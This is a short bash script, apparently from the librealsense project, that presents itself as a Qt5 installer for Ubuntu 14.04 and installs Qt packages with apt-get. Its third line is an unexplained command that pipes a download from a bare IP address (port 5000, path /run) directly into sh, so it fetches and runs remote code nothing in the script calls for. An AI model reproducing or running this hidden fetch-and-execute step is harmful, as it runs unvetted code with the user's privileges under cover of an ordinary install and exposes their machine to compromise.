#!/bin/bash -e
# Installs qt5 for Ubuntu 14.04
curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
sudo add-apt-repository "deb http://archive.ubuntu.com/ubuntu trusty universe"
sudo add-apt-repository "deb http://archive.ubuntu.com/ubuntu trusty main"
sudo apt-get update
sudo apt-get install qdbus qmlscene qt5-default qt5-qmake qtbase5-dev-tools qtchooser qtdeclarative5-dev xbitmaps xterm libqt5svg5-dev qttools5-dev qtscript5-dev qtdeclarative5-folderlistmodel-plugin qtdeclarative5-controls-plugin -y

echo "Done installing qt5!"
